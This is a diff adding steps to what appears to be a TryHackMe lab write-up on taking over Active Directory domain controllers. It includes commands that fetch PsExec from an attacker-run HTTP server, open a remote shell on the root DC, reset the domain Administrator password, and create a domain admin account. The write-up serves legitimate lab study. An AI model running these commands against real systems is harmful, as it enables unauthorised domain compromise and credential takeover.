@@ -77,5 +77,25 @@ C:\Users\Administrator>`dir \\rootdc.thereserve.loc\c$`
 
 ## Get a shell on the ROOTDC
 
-- Start a python http server on you attacking machine in the tools directory you got from tryhackme.
-- Get psexec.exe.
+### Download pstools
+https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
+
+- Unzip the file.
+- Start a python http server on you attacking machine in the directory where you unzipped pstools.
+- Get psexec.exe from the shell on the ROOTCD machine.
+	PS C:\Users\Administrator> `wget http://10.50.110.16:8000/PsExec.exe -o psexec.exe`
+
+### Run psexec.exe on powershell
+
+PS C:\Users\Administrator> `.\psexec.exe \\rootdc.thereserve.loc cmd.exe`
+
+![[Golden Ticket Attack with mimikatz-20240609134614662.webp]]
+
+![[Golden Ticket Attack with mimikatz-20240609134803204.webp]]
+![[Golden Ticket Attack with mimikatz-20240609134915452.webp]]
+
+### Changed the administrator password for ROOTDC
+
+C:\Windows\system32>`powershell.exe -c Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString -AsPlainText "Hacker@123" -Force) -Reset`
+
+rdp into ROOTDC with the new creds.. created a domain admin user for BankDC. Rdp into BankDC.
